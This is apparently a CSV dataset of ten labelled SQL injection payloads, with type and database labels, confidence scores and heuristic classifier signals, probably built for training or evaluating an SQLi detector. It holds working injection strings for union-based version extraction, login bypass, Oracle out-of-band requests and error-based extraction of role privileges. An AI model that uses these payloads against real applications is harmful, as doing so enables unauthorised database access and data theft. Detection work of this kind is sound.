payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",union_based,mssql,0.85,+$ . + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,200,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 +$ . union select null,@@VERSION -- 1"
"select * from users where id = 1 or 1#""? union select null,version ( ) -- 1",union_based,mysql,0.85,"#? union select null,version()",KEEP,,union_based,mysql,201,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""? union select null,version ( ) -- 1"
admin' ) or '1' = '1'#,auth_bypass,generic,0.95,admin') or ('1'='1'# for auth bypass,KEEP,,auth_bypass,generic,202,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,admin' ) or '1' = '1'#
||utl_http.request ( 'httP://192.168.1.1/' ) ||',out_of_band,oracle,0.95,utl_http.request for Oracle OOB,KEEP,,out_of_band,oracle,203,out_of_band,generic,Pattern match: 'utl_http' → out_of_band (P6); DB signature: generic,out_of_band,generic,OOB file/network function,||utl_http.request ( 'httP://192.168.1.1/' ) ||'
or '7659' = '7659,boolean_blind,generic,0.9,or '7659'='7659' for boolean blind SQLi,KEEP,,boolean_blind,generic,204,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,or '7659' = '7659
"select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""{@ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,205,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""{@"" or 1 = 1 -- 1"
"select * from users where id = 1 union select +!<1,version ( ) -- 1",union_based,mysql,0.8,+!<1 union select for union SQLi,KEEP,,union_based,mysql,206,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select +!<1,version ( ) -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",error_based,oracle,0.95,dba_role_privs + utl_inaddr error SQLi,KEEP,,error_based,oracle,207,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 6 ) ) AND 'i' = 'i"
"select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,"\""@ obfuscation for boolean blind SQLi""",KEEP,,boolean_blind,mysql,208,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1"
"select * from users where id = 1 union select !<1,version ( ) -- 1",union_based,mysql,0.8,!<1 + version() for union SQLi,KEEP,,union_based,mysql,209,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select !<1,version ( ) -- 1"
